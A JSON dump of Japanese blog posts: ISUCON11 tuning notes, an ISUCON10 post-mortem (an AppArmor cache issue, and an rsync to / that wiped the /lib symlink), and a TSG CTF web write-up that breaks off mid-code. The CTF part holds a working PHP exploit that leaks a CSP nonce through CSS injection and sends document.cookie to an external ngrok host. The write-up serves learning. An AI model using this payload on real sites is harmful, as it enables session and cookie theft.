{"pageProps":{"tag":"参加記","entries":[{"type":"article","slug":"30","body":"NaruseJunチームでISUCON11予選に出ました。\n\n- チームメンバー[^team]\n\t- [@to_hutohu](https://twitter.com/to_hutohu)\n\t- [@takashi_trap](https://twitter.com/takashi_trap)\n\t- [@sekai67](https://twitter.com/sekai67)\n- 結果\n\t- スコア: [919720](https://isucon.net/archives/56021246.html)\n\t- 本戦に行ける！🎉🎉\n\t\t- ココ最近のNaruseJunチームは追試失敗率が高く[^fail]て、2年間本戦に行けていませんでした。悲願達成感があります。\n\n[^team]: 全員が今年出題の[東京工業大学デジタル創作同好会traP](https://trap.jp/)のOBです。\n[^fail]: 運営サイドにも[定評のある](https://twitter.com/sora_h/status/1429334456616189957)失敗率。\n\n## やったこと\n\n- NaruseJunチームは基本的に個々人が勝手に改善を突っ込んていくスタイル\n\t- 担当範囲などはあえて決めておらず、全員アプリを触るしインフラもいじる\n\t- ミドルウェアの設定、アプリコード、デプロイスクリプトが全部入った[リポジトリ](https://github.com/narusejun/isucon11-qualify)を使った\n\t\t- それぞれローカルで作業、ブランチを切ってリモートにプッシュ、サーバ上でプルしてデプロイ、といった動き\n\t\t\t- ローカルではテストしない（環境まわりでハマるのは時間の無駄なので）\n\t\t\t- 3人で別々に動いているので、声掛けでサーバの占有権を取ってベンチを投げ、それで動作確認する感じ\n- 初動だけは担当作業を決めていた\n\t- to_hutohu: マニュアル読み込み\n\t- takashi_trap: リポジトリ、デプロイスクリプト周りの準備\n\t- sekai67: 環境立ち上げ、計測ツール類準備\n\t\t- 細かいツールの導入などはすべてansibleで行う\n\t\t\t- [最初の変更](https://github.com/narusejun/isucon11-qualify/commit/6b74fb20740ca5fa31070d7763437d3867e6f063)をリポジトリに入れてデプロイするまで **17分**\n\t\t\t\t- 最初の動きをよく詰めておいたので、スムーズに改善へ移れた\n- 計測結果を元に改善ポイントを見つけた\n\t- **「推測するな、計測せよ」**\n\t- pprof, [fgprof](https://github.com/felixge/fgprof), [alp](https://github.com/tkuchiki/alp), [pt-query-digest](https://www.percona.com/doc/percona-toolkit/LATEST/pt-query-digest.html), [netdata](https://github.com/netdata/netdata) を見ていた\n\t\t- pprofは基本的にFlame Graphだけ見れば大体わかる\n\t- [pprotein](https://github.com/kaz/pprotein)というツールを作って、使った\n\t\t- pprof, alp, pt-query-digestのデータをサーバから収集し、Webブラウザ上で表示できるようにしたもの\n\t\t\t- 過去の計測結果を見れたり、チーム内で計測結果を見ながら相談できたりするので便利\n\t\t- こういうツールを作るのが最近流行ってそう\n\t\t\t- https://twitter.com/_tsuzu_/status/1429064558203731973\n\t\t\t- https://diary.hatenablog.jp/entry/2021/08/22/175403\n\t\t- pproteinはいまのところオープンソースなので、ご活用ください\n\t\t\t- ただしREADMEは書いてない\n- 以下2点の理由から、15時過ぎから新たな改善を入れるのをほぼストップし、追試対策など安全に通過するための戦略に切り替えた（前年の反省）\n\t- 80万点に到達した15時時点で、次点は10万点代、大多数が10万点未達という状況であったこと\n\t- 特定の状況下（http2のGOAWAYハンドリングミス[^goaway]）でベンチマーカーがエラーになり、場合によってはスコアなしになる可能性が残っていたこと\n\t\t- 競技中、これがこちら側のミスであるか、運営側のミスであるかを判断できなかった[^clar]ため、念の為修正を行う判断に至ったが、結果としては不要だった\n\n[^goaway]: 詳細については[予選結果](https://isucon.net/archives/56021237.html)の「不具合について」を参照。\n[^clar]: 競技中に質問を行い「ベンチマーカーのバグである」との回答を頂いてはいましたが、チーム内での議論の結果、必ずしもそうとは言えないのではないかという結論になりました。\n\n### こぼれ話\n\n- 14:30〜15:10まで、コミットするたびに点数が指数関数的に増加した\n\t- あまりにも上がるし、自分たちの想像以上に上がるので、けっこう驚いていた\n\t\t- 運営さんもかなり驚いたたようで、「ベンチマーカーの実装がバグっている可能性がある」として個別で改善方法を確認されました\n\t\t\t- 結果としてバグではなかったのでハッピーエンド\n\t\t- 点数が上がるたびにバグの疑念が強まり、[ベンチマーカー実装担当](https://twitter.com/ryoha000/status/1429097219391574024)の顔がどんどん曇っていったらしい\n\n![](score.png)\n\n### 具体的な改善内容\n\n- だいたい時系列順\n- 初期スコア: 2000くらい\n\t- 改善後スコアは必ずしも当該の改善のみが寄与しているわけではないので注意\n\n#### `isu_condition` テーブルにインデックスを貼る\n\n- 時間: 10:40\n- スコア: 19000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/4132537145c01a54b86207c9e130d3d94b8dc895\n- 根拠\n\t- pt-query-digest結果から。この時点での合計クエリ時間上位2つがこれだった\n\t```\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by `timestamp` desc limit ?\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by timestamp desc\n\t```\n\n#### `/api/trend` で返すデータを 0.5 秒ごとに作るようにする\n\n- 時間: 11:10\n- スコア: 26000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/1e24895db95c0ce776b8751bcf90a49e37ea17b0\n- 根拠:\n\t- pprofのFlame Graphから。getTrendで発行してるSELECTに時間がかかっている[^pprof]。\n\n[![](fg1.png)](fg1.png)\n\n[^pprof]: 次項のFlame Graphと見比べるとgetTrendがすっかり見えなくなっていることがわかります。\n\n#### `isu_condition` テーブルを水平分割 + ログを出さない\n\n- 時間: 12:20\n- スコア: 42000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/fda74ca7e56b70a58a7a49c773cb892d3dae6765\n\t\t- UUIDを使って振り分け先のサーバを決定して、そのサーバから読み書きする。\n\t\t- トランザクションが邪魔なので、消す。よく読むと、トランザクションなしでも正常に処理できることが分かる。\n- 根拠\n\t- alpから。POST `^/api/condition/.+$`の合計時間が大きい。GETもそこそこ大きい。\n\t- pprofのFlame Graphから。getIsuConditions/postIsuConditionsが重い。\n\n[![](fg1.png)](fg1.png)\n\n#### iconをDBにつっこむのをやめてファイルに書き出す\n\n- 時間: 12:50\n- スコア: 52000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/e3cc31346fb89455a0f0123e9ea08156914e28c4\n\n#### 微調整\n\n- 時間: 13:30\n- スコア: 64000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/68f2d06510e6ad147a623bce64dcc0d2b1ab56ca\n\t\t- あえてtrendを返すのを遅くして、ユーザー数の増加を抑える。\n\t- https://github.com/narusejun/isucon11-qualify/commit/72368dc1582670ccdce6fc2e727bb82da5292b30\n\t\t- DBを3台から2台に減らして、appへよりCPU時間を配分する。\n- 根拠\n\t- netdata等から。appとDBが同居しているサーバでCPU使用率がほぼ100%なのに対して、DBのみが動くサーバではまだ余裕があったため。\n\n#### backendを複数台に\n\n- 時間: 14:00\n- スコア: 72000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/99ec56508bb5fc501133f06cc913e20c98de1ec7\n\t\t- appを3台にして、postIsuConditionのみを複数台で処理させる。\n- 根拠\n\t- netdata等から。appサーバからDBを剥がしてもまだCPU使用率が100%だったため。\n\n#### getIsuConditionsFromDBの高速化\n\n- 時間: 14:30\n- スコア: 107000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/7981a778309e216b3734d817c3458c15f20d5564\n\t\t- Generated Column追加、SQLでLIMITする。\n- 根拠\n\t- pt-query-digestから。以下のクエリが遅い＋Rows_sentが異常に大きい。\n\t  ```\n\t  select * from `isu_condition` where `jia_isu_uuid` = ? and `timestamp` < ? order by `timestamp` desc\n\t  ```\n\t- pprofのFlame Graphから。getIsuConditionsFromDBの圧倒的存在感。。。\n\n[![](fg3.png)](fg3.png)\n\n#### `postIsuCondition` バルクインサート + postIsuCondition全受理\n\n- 時間: 14:40\n- スコア: 158000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/d375e46e3d72547b8a3d67a97f26133981264680\n\t- https://github.com/narusejun/isucon11-qualify/commit/4e2da32e02b079fbe56ed2188dabd5639ef7f2c3\n\n#### nginx調整\n\n- 時間: 14:50\n- スコア: 295000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/9e47a40a1f1af444a07fa93c1cc3a33372904b5a\n\t\t- getIsuGraphを3台処理に変更、nginx-backend間通信のkeepalive化。\n- 根拠\n\t- netdata等から。1台目のappサーバがキツそうだったのと、その割にほか2つがヒマそうだったので。\n\n#### getTrend調整\n\n- 時間: 15:00\n- スコア: 346000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/6cc6d718095b0e1d4ffbc3277e53d8ac4966bf52\n\t\t- 意図的にtrendを返すのを遅くしていたところを少しだけ早くしてユーザー数を増やす。\n\n#### グラフ作成時の取得データ量を減らす\n\n- 時間: 15:00\n- スコア: 631000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/659cb46e1210c56aaabf6f40681bfe705453a686\n\t\t- WHERE句にtimestampの範囲で絞る条件を追加。\n- 根拠\n\t- pt-query-digestから。以下のクエリが遅い＋Rows_sentが異常に大きい。\n\t```\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by `timestamp`\n\t```\n\n#### nginx調整\n\n- 時間: 15:10\n- スコア: 836000〜932000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/3d9f96bfe12f263a0ea8f3aa759b8e73c2659f0a\n\t\t- nginxとappが同居してる場合はnginx-app間通信をunix domain socket経由に\n\t- https://github.com/narusejun/isucon11-qualify/commit/5f4f37918c900ae106da1b54da66d59399da3a41\n\t\t- nginx-app間のkeepaliveコネクション数調整\n\n#### 微調整\n\n- 時間: 16:00〜17:00\n- スコア: 1010000〜1173984(ベストスコア)\n- パラメータをいろいろ調整してた\n\t- MySQL設定\n\t- nginx設定\n\t- getTrend待ち時間\n\n#### 最終\n\n- 時間: 17:00〜\n- スコア: 988417(最終スコア)\n- http2のGOAWAY問題[^goaway]でベンチマークがまれに失敗する問題の対応\n\t- 安全に追試をパスできるように少し性能を落とした\n\n## おわり\n\n運営の皆さんありがとうございました。\n","title":"ISUCON11予選に参加した","image":null,"tags":["ISUCON","インフラ","参加記"],"date":"2021-08-23T00:00:00.000Z","updated":"2021-08-22T19:00:52.000Z"},{"type":"article","slug":"28","body":"ISUCON10お疲れさまでした。運営の皆さん、ありがとうございました。\n\nボク、[@sekai67](https://twitter.com/sekai67)はNaruseJunチームの一員として出場しました。結果はこう。\n\n- 予選では、本選出場圏内の点数を取って余裕をカマしていましたが、追試をパスできずに予選落ち。\n- 本選では、[本選ライブ](http://isucon.net/archives/55063136.html)の企画で、並行チームとして問題に取り組ませてもらう。\n\t- 競技中最高得点 **52567** を記録するものの、追試をパスできず記録なし。伝統芸能\n\nこれは記念写真です。\n\n![](score.png)\n\nまあ追試で落ちてるんですけどね！\n\n参加記はチームメイトの[@to_hutohu](https://twitter.com/to_hutohu)と[@takashi_trap](https://twitter.com/takashi_trap)が書いてくれると信じて、ボクはちょっとしたこぼれ話を書いていきます。\n\n## やらかしリスト\n\n予選、本選どちらにおいても、思い返すとまあいろいろやらかしたんですが、今回は興味深かった2つを抜粋して掘り下げます。\n\n- 予選時、再起動試験を5回ぐらいして、追試落ちは絶対ない状態まで持っていったのに無事追試落ちした話\n- 本選開始後、初手でサーバの1台を使い物にならなくしてチームメイトを困惑させた話\n\n## 予選の追試で落ちた\n\n### 経緯\n\n予選では、チームメイトの2人がわりとギリギリまでアプリ実装のバグ取りを詰めていたので、ボクが1人で再起動試験や後片付けを担当することになりました。\n去年も再起動後に正しく動作させることができずに予選落ちしていますので、今年こそは！と念入りに何度も行っていました。\n\n5回ほど再起動してもOK、再起動後にもデータも正しく引き継がれている。絶対落ちないだろコレは！！！\nと自信満々で競技を終えたわけですが、結果発表でチーム名が呼ばれることはありませんでした……\n\n夜中、凹みつつも競技で使ったサーバの様子を見に行ってみると……\nDBサーバが落ちてるやんけ！！！！！なんで？？！？！？？！？？！！！\n\n### 理由\n\napparmorのポリシー(mysql-serverパッケージに入ってる`/etc/apparmor.d/usr.sbin.mysqld`)が生きていて、systemdがmariadbの起動を検知できておらず、`systemctl stop`相当の処理がかかったため。\n\nUbuntuで、最初にmysqlが動いている状態から、これをmariadbに置き換えると起動しなくなるという事例があります。\nこちらの記事が詳しいです。\n\n[Ubuntuでmysql-serverをmariadb-serverで置き換えるとsystemd経由でmariadbが起動できない](/posts/24/)\n\n## 疑問1: mariadbに入れ替えたときにto-hutohuが`aa-remove-unknown`でポリシーを消したのでは？\n\n先ほど紹介した記事を書いたのはボクです。ですので、もちろんこの挙動については知っていました。\n上記記事で紹介されている対策法をもちろん講じています。\n\nが、これはそもそも恒久対応ではありませんでした……！\nわかりにくい書き方でゴメンナサイ。\n\n先の記事で言及している、\n\n> /etc/apparmor.d/usr.sbin.mysqldは空のファイルで上書きされますが、AppArmorがすでに読み込んでいるプロファイルは削除されません。\n> また、systemctl reload apparmorしても、OSを再起動しても、一度読み込まれたプロファイルが勝手に削除されることはありません。\n\nここの理解が曖昧、あるいは間違っています。\n\nポリシーがOSを再起動しても消えない原因は、apparmorのポリシーキャッシュのせいで、`/etc/apparmor.d/cache/usr.sbin.mysqld`が存在して、かつ`/etc/apparmor.d/usr.sbin.mysqld`よりタイムスタンプが新しい場合、キャッシュのほうが読み込まれるという挙動をします。\n\n- `/etc/apparmor.d/cache/usr.sbin.mysqld`が作成されるのは、mysql-serverインストール時。\n\t- つまりタイムスタンプは → `Sep 11 11:34`\n- `/etc/apparmor.d/usr.sbin.mysqld`のタイムスタンプは、mariadbパッケージが作成された時。\n\t- つまりタイムスタンプは → `Jul 20 10:50`\n\nですので、`/etc/apparmor.d/usr.sbin.mysqld`が更新されたにも関わらず、キャッシュのほうがずっと読み込まれ続けてしまうのでした……！\n\n正しい対応は、`systemctl reload apparmor`でした。\nこれでキャッシュのflushが走り、正しくmariadbに起動するようになります。\n\n例の記事については、そのうち書き換えておきますね……\n\n### 疑問2: sekaiが再起動試験を行ったときにうまく動作していたのは何故？\n\n再起動後15分以内にのみ試験していたからです。\n\nAppArmorのせいでmariadbに起動に失敗するというのは、厳密に言うと、 **mariadbは起動に成功しているんだけどsystemdがそれを検知できていない** ということ。\nsystemdは一定時間（デフォルトで15分）以内にサービスの起動を確認できないと、ご丁寧にExecStopを走らせてくれるのです……！\n\nsekaiが再起動したのは **11:39:26 UTC** ごろ。\n\n```\n-- Reboot --\nSep 12 11:39:26 s2 systemd[1]: Starting MariaDB 10.1.44 database server...\nSep 12 11:39:32 s2 mysqld[1244]: 2020-09-12 11:39:32 139768179551360 [Note] /usr/sbin/mysqld (mysqld 10.1.44-MariaDB-0ubuntu0.18.04.1) starting as process 1244 ...\nSep 12 11:45:11 s2 systemd[1]: Stopped MariaDB 10.1.44 database server.\n-- Reboot --\n```\n\n11:45:11にStopしてるのは、このあともう一度再起動試験したためです。\n\nこの付近のkern.logは以下。\n\n```\nSep 12 11:39:35 s2 kernel: [   42.180656] audit: type=1400 audit(1599910775.956:18): apparmor=\"DENIED\" operation=\"sendmsg\" info=\"Failed name lookup - disconnected path\" error=-13 profile=\"/usr/sbin/mysqld\" name=\"run/systemd/notify\" pid=1244 comm=\"mysqld\" requested_mask=\"w\" denied_mask=\"w\" fsuid=111 ouid=0\n```\n\nsd-notify失敗してるので、この時点でもAppArmorのポリシーが生きています。\nsystemdはこのときずっとmariadbが上がってくるのを待っている状態です。\nただし、mariadb自体は起動しているので、アプリへのリクエストは通る状態です。\n（sekaiのこの状態でずっと再起動試験をしていたわけです。バカですねえ。）\n\n一方で、運営による再起動が行われたと思われる時刻(14:20:38 UTC つまり 23:20:38 JST)付近のログは以下のとおり。\n\n```\n-- Reboot --\nSep 12 14:20:38 s2 systemd[1]: Starting MariaDB 10.1.44 database server...\nSep 12 14:20:42 s2 mysqld[1100]: 2020-09-12 14:20:42 140238334753920 [Note] /usr/sbin/mysqld (mysqld 10.1.44-MariaDB-0ubuntu0.18.04.1) starting as process 1100 ...\nSep 12 14:35:41 s2 systemd[1]: mariadb.service: Start operation timed out. Terminating.\nSep 12 14:35:43 s2 systemd[1]: mariadb.service: Failed with result 'timeout'.\nSep 12 14:35:43 s2 systemd[1]: Failed to start MariaDB 10.1.44 database server.\n```\n\n15分立ったのでmariadbがshutdownされたと思われます。\n以下は`/var/lib/mysql/error.log`です。\n\n```\n2020-09-12 14:35:41 140238333712128 [Note] /usr/sbin/mysqld: Normal shutdown\n2020-09-12 14:35:41 140238333712128 [Note] Event Scheduler: Purging the queue. 0 events\n2020-09-12 14:35:41 140236692629248 [Note] InnoDB: FTS optimize thread exiting.\n2020-09-12 14:35:41 140238333712128 [Note] InnoDB: Starting shutdown...\n2020-09-12 14:35:41 140238333712128 [Note] InnoDB: Waiting for page_cleaner to finish flushing of buffer pool\n2020-09-12 14:35:43 140238333712128 [Note] InnoDB: Shutdown completed; log sequence number 3710056674\n2020-09-12 14:35:43 140238333712128 [Note] /usr/sbin/mysqld: Shutdown complete\n```\n\n実際にアプリにリクエストが来たのは、15:03:13 UTCでした。\n\n```\nSep 12 14:20:45 s1 isuumo[903]: ⇨ http server started on [::]:1323\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 packets.go:122: closing bad idle connection: unexpected read from socke\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 connection.go:158: driver: bad connection\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 packets.go:122: closing bad idle connection: unexpected read from socke\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 connection.go:158: driver: bad connection\n```\n\nこのとき、もうmariadbはshutdown済みなので、当然アプリは動かないわけですね……\n\n## 開始後即サーバを破壊\n\n### 経緯\n\n本選始まって直後の話。\n\nNaruseJunチームでは、Makefileをタスクランナー的に使っていて、[ここ](https://github.com/narusejun/isucon10-final/blob/master/Makefile)にデプロイコマンドを書いていました。\nsekaiがアプリにpprofを埋め込んだコードをプッシュし、サーバ上にデプロイしようとして`make deploy`を叩いたところ、なぜか途中で`sh: Command not found`のエラーが出てmakeが終了しました。\n\nアレ？`sh`って存在しないんだっけと思い、今度は`ls -l /usr/bin/sh`を実行してみると、今度は`bash: /usr/bin/ls: No such file or directory`が……\nここで全てを悟ります。これ、シェル組み込みのコマンド以外、全て使えなくなってるな……？\n\n心当たりがないわけではありませんでした。3人共、ある会話が頭をよぎりました……\nあれは予選時のことです――――\n\n> sekai「ミドルウェアの設定ファイルなども、リポジトリに含めてしまって、デプロイ時にrsyncで配置するようにしませんか？」\\\n> takashi「rsyncですか？どうやってやるんですか」\\\n> sekai「コマンド一発でできますよ。[こう](https://github.com/narusejun/isucon10-qualify/blob/master/Makefile#L50)ですね」\n\n```\n$ ls files\netc/       home/      lib/\n$ sudo rsync -r files/ /\n```\n\n> takashi「**これってもともとサーバ上にあるファイルが消えたりしませんか？**」←ここフラグ\\\n> sekai「大丈夫ですよ。ほら、追加したファイルだけ更新されてるでしょ？」\n\n予選では確かに、このコマンドでうまくデプロイできていました。\nですので、本選でも同じように設定ファイル類を配置しようとしていました。\n\nしかしながら、事実、サーバが壊れました。何故でしょう……\nこのときのログはこうでした。\n\n```\n〜〜〜略〜〜〜\nmake[1]: Leaving directory '/home/isucon/isucon10-final/app/webapp/golang'\nsudo rsync -v -r s1/ /\nsending incremental file list\ndeploy.sh\nskipping non-regular file \"etc/mysql/my.cnf\"\netc/envoy/config.yaml\netc/mysql/debian-start\netc/mysql/debian.cnf\netc/mysql/my.cnf.fallback\netc/mysql/mysql.cnf\netc/mysql/conf.d/mysql.cnf\netc/mysql/conf.d/mysqldump.cnf\netc/mysql/mysql.conf.d/mysql.cnf\netc/mysql/mysql.conf.d/mysqld.cnf\netc/systemd/system/envoy.service\netc/systemd/system/xsuportal-api-golang.service\netc/systemd/system/xsuportal-web-golang.service\nhome/isucon/env\nlib/\nlib/systemd/\nlib/systemd/system/\nlib/systemd/system/mysql.servicesent 11,952 bytes  received 375 bytes  24,654.00 bytes/sec\ntotal size is 10,449  speedup is 0.85\nsh s1/deploy.sh\nmake: sh: Command not found\nmake: *** [Makefile:54: start] Error 127\n```\n\nう〜ん、`--delete`オプションも付けてないし、このログを見ても特におかしくないしなあ。\n本選時はそう思っていました。\n\nここを詳しく調査する時間がもったいないので、運営にサーバをリセットしてもらい（ご迷惑おかけしました……）、とりあえず危険なMakefileは使用禁止として競技に戻りました。\n\n### その後\n\n競技は無事(?)終了し、翌日。ちゃんと調査しました。\n\nさて、件のログをよ〜く見ると、なんだかヤバそうなところが見つかりますね！？\n\n正解は`lib/`とだけ書いてある行です。\nこれは、rsyncによって`lib/`というディレクトリ、今回は宛先が`/`なので、要は`/lib`が作成されたという意味です。\nんん？？それはマズくないか？？？？？\n\nマズいです。コマンドがほぼ使えなくなったのは、間違いなく`/lib`にある共有ライブラリなどが消滅したからでしょう。\n\nでも、予選時はちゃんと動いていたんです。じゃあなんで？？？\n\n答えは、Ubuntuのバージョン違いにありました。\n予選では18.04、本選では20.04です。各バージョンでのルートディレクトリがどうなっているかと言うと……\n\n18.04では、こう。\n\n```\n# ls -l /\ntotal 64\ndrwxr-xr-x   2 root root 4096 Sep 21 17:17 bin\ndrwxr-xr-x   2 root root 4096 Apr 24  2018 boot\ndrwxr-xr-x   5 root root  360 Oct  4 07:46 dev\ndrwxr-xr-x   1 root root 4096 Oct  4 07:46 etc\ndrwxr-xr-x   2 root root 4096 Apr 24  2018 home\ndrwxr-xr-x   8 root root 4096 May 23  2017 lib\ndrwxr-xr-x   2 root root 4096 Sep 21 17:16 lib64\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 media\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 mnt\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 opt\ndr-xr-xr-x 174 root root    0 Oct  4 07:46 proc\ndrwx------   2 root root 4096 Sep 21 17:17 root\ndrwxr-xr-x   1 root root 4096 Sep 25 22:33 run\ndrwxr-xr-x   1 root root 4096 Sep 25 22:33 sbin\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 srv\ndr-xr-xr-x  13 root root    0 Oct  4 07:46 sys\ndrwxrwxrwt   2 root root 4096 Sep 21 17:17 tmp\ndrwxr-xr-x   1 root root 4096 Sep 21 17:14 usr\ndrwxr-xr-x   1 root root 4096 Sep 21 17:17 var\n```\n\n一方で20.04では……？\n\n```\n# ls -l /\ntotal 48\nlrwxrwxrwx   1 root root    7 Sep 25 01:20 bin -> usr/bin\ndrwxr-xr-x   2 root root 4096 Apr 15 11:09 boot\ndrwxr-xr-x   5 root root  360 Oct  4 07:46 dev\ndrwxr-xr-x   1 root root 4096 Oct  4 07:46 etc\ndrwxr-xr-x   2 root root 4096 Apr 15 11:09 home\nlrwxrwxrwx   1 root root    7 Sep 25 01:20 lib -> usr/lib\nlrwxrwxrwx   1 root root    9 Sep 25 01:20 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root    9 Sep 25 01:20 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root   10 Sep 25 01:20 libx32 -> usr/libx32\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 media\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 mnt\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 opt\ndr-xr-xr-x 171 root root    0 Oct  4 07:46 proc\ndrwx------   2 root root 4096 Sep 25 01:23 root\ndrwxr-xr-x   1 root root 4096 Sep 25 22:34 run\nlrwxrwxrwx   1 root root    8 Sep 25 01:20 sbin -> usr/sbin\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 srv\ndr-xr-xr-x  13 root root    0 Oct  4 07:46 sys\ndrwxrwxrwt   2 root root 4096 Sep 25 01:23 tmp\ndrwxr-xr-x   1 root root 4096 Sep 25 01:20 usr\ndrwxr-xr-x   1 root root 4096 Sep 25 01:23 var\n```\n\nアッ……（完全に理解）\n\nUbuntu 20.04では、`/lib`は通常のディレクトリではなく、`/usr/lib`へのシンボリックリンクでした！\nrsyncでは、デフォルトではシンボリックリンクの先がディレクトリであっても、それを辿ってその先にコピーをしたりしません。\nソース側のディレクトリでそのまま上書きして、もとのリンクは消してしまうんですね……！\n\n### 教訓\n\nこの悲劇を回避するには、rsyncの`--keep-dirlinks`というオプションを使うべきでした。\n以下、`man rsync`より引用です。\n\n> -K, --keep-dirlinks\n>     This option causes the receiving side to treat a symlink to a directory as though it were a real directory, but only if it matches a real directory from the sender. Without this option, the receiver's symlink would be deleted and replaced with a real directory.\n>     For example, suppose you transfer a directory lqfoorq that contains a file lqfilerq, but lqfoorq is a symlink to directory lqbarrq on the receiver. Without --keep-dirlinks, the receiver deletes symlink lqfoorq, recreates it as a directory, and receives the file into the new directory. With --keep-dirlinks, the receiver keeps the symlink and lqfilerq ends up in lqbarrq.\n\nちょうどボクが踏んだ罠について言及されています。\nrsyncは気をつけて使います……\n\n## おしまい\n\nISUCONは学びが多い。\n\nあと、予選で雑にmysqlの全テーブルをMEMORYストレージエンジンにしたらメモリが完売してSSHできなくなって焦るなどの事件もありました。\n（運営に再起動してもらって事なきを得ました。）\n","title":"ISUCON10 やらかしリスト","image":null,"tags":["AppArmor","ISUCON","systemd","インフラ","参加記"],"date":"2020-10-04T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"27","body":"[TSG CTF](https://ctftime.org/event/758)にチームNaruseJunで出ました。4099ptsを獲得して3位でした。\n\n[TSG CTF](https://ctftime.org/event/758)\n\n私はWeb問のみを解きました。以下write-upです。\n\n# BADNONCE Part 1 (247pts)\n\nCSPが有効になっているページでXSSしてCookieを盗ってください、という問題でした。\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-<?= $nonce ?>';\">\n```\n\n問題名が **BADNONCE** なので明らかにnonceの実装が悪そうです。\n実際、以下のようにセッションIDに対してnonceが固定なので、これが漏れるとXSSが可能になります。\n\n```php\nsession_start();\n$nonce = md5(session_id());\n```\n\n件のnonceは、ページ内の要素の属性として存在しています。\n\n```html\n<script nonce=<?= $nonce ?>>\n\t\t\t\tconsole.log('Welcome to the dungeon :-)');\n</script>\n```\n\nところで、このページでは`script-src`のみ制限されているので、たとえばスタイルシートなどは外部ソースから読み込み放題です。\nしたがって、CSS Injectionが可能です。セレクタを工夫することによって、要素の属性値を特定することができますね。\n\n[CSS Injection 再入門 – やっていく気持ち](https://diary.shift-js.info/css-injection/)\n\nただし、管理者のブラウザを模したクローラは、毎回異なるPHPSESSIDを持つため、1度の起動で最後までnonceを抜きとって、XSSを踏ませるところまでやらないといけません。\nちょっと面倒ですが、管理者に攻撃車が用意したURLをIFRAMEで開き続けるページを踏ませて、InjectするCSSを変えながら、最終的にXSSを発火させるようにしました。\n以下のような実装になりました。Web問のExploitにしてはちょっと重めかも。もっと頭のいい方法が存在する可能性もあり。\n\n```php\n<?php\n\tif (array_key_exists(\"save\", $_GET)) {\n\t\tfile_put_contents(\"flag.txt\", $_GET[\"save\"] . PHP_EOL, LOCK_EX | FILE_APPEND);\n\t}\n\telse if (array_key_exists(\"nonce\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < strlen($_GET[\"nonce\"])) {\n\t\t\tfile_put_contents(\"nonce.txt\", $_GET[\"nonce\"], LOCK_EX);\n\t\t}\n\t}\n\telse if (array_key_exists(\"css\", $_GET)) {\n\t\theader(\"Content-Type: text/css\");\n\t\techo(\"script { display: block }\" . PHP_EOL);\n\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\t$chars = str_split(\"0123456789abcdef\");\n\n\t\tforeach ($chars as $c1) {\n\t\t\tforeach ($chars as $c2) {\n\t\t\t\t$x = $nonce . $c1 . $c2;\n\t\t\t\techo(\"[nonce^='\" . $x . \"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce=\" . $x . \") }\" . PHP_EOL);\n\t\t\t}\n\t\t}\n\t}\n\telse if (array_key_exists(\"go\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < 32) {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D\" . microtime(true) . \"%22%3E\");\n\t\t}\n\t\telse {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22\" . $nonce . \"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E\");\n\t\t}\n\t}\n\telse if (array_key_exists(\"start\", $_GET)) {\n\t\tfile_put_contents(\"nonce.txt\", \"\", LOCK_EX);\n\t\tfile_put_contents(\"flag.txt\", \"\", LOCK_EX);\n?>\n<html>\n<body>\n<script>\n\tsetInterval(() => {\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.src = `?go=${(new Date).getTime()}`;\n\t\tdocument.body.appendChild(iframe);\n\t}, 256);\n</script>\n</body>\n</html>\n<?php\n\t}\n\telse {\n\t\techo(\"E R R O R !\");\n\t}\n?>\n```\n\n# Secure Bank (497pts)\n\nrubyで書かれたアプリケーションで、コインの送受信ができます。\nたくさんのコインを集めれば、FLAGが入手できるようです。\n\n```ruby\n  get '/api/flag' do\n    return err(401, 'login first') unless user = session[:user]\n\n    hashed_user = STRETCH.times.inject(user){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_user\n    row = res.next\n    balance = row && row[0]\n    res.close\n\n    return err(401, 'login first') unless balance\n    return err(403, 'earn more coins!!!') unless balance >= 